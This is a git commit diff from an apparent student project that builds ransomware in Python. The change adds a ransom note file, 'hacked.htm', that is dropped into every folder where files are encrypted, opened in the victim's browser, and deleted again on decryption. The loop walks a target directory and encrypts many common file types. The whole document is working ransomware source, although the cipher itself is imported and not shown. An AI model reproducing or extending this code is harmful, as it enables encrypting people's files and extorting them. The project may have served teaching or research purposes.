20ad040c08882e89fd76cfffb680fd598f8e2010
Mark Bellingham <14032098@stu.mmu.ac.uk>
2016-12-04 20:53:47 +0000

    message_to_victim copied to all folders with encrypted files & removed on decryption

--- main_program.py
+++ main_program.py
@@ -1,6 +1,7 @@
 from product_cipher import *
 from functions import *
 import webbrowser
+from shutil import copy
 import os
 
 
@@ -15,6 +16,9 @@ def main():
     # Specify the root directory and get a list of files
     path = "target_folder/"
 
+    # File to display message to victim
+    message_to_victim = "hacked.htm"
+
     # List of the filetypes that are supported by the program
     ext = ('.txt', '.xhtml', '.html', '.htm', '.css', '.php', '.sql',
            '.java', '.jsp', '.js', '.xml', '.xsl', '.xsd', '.xslt', '.xlog',
@@ -26,17 +30,23 @@ def main():
     # on the supported list. If it is, create a full filename including
     # the path and pass it to either encrypt or decrypt depending on the mode
     for root, subdir, files in os.walk(path):
+        check = 0
         for filename in files:
             if filename.endswith(tuple(ext)):
                 filename = os.path.join(root, filename)
                 if mode == 'encrypt':
                     encrypt(key, mode, filename)
+                    if check == 0:
+                        copy(message_to_victim, root)
+                        check = 1
                 elif mode == 'decrypt':
-                    decrypt(key, mode, filename)
+                    if filename == os.path.join(root, message_to_victim):
+                        os.remove(filename)
+                    else:
+                        decrypt(key, mode, filename)
 
     if mode == 'encrypt':
-        link = "hacked.htm"
-        webbrowser.open(link)
+        webbrowser.open(message_to_victim, new=1)
 
 
 main()
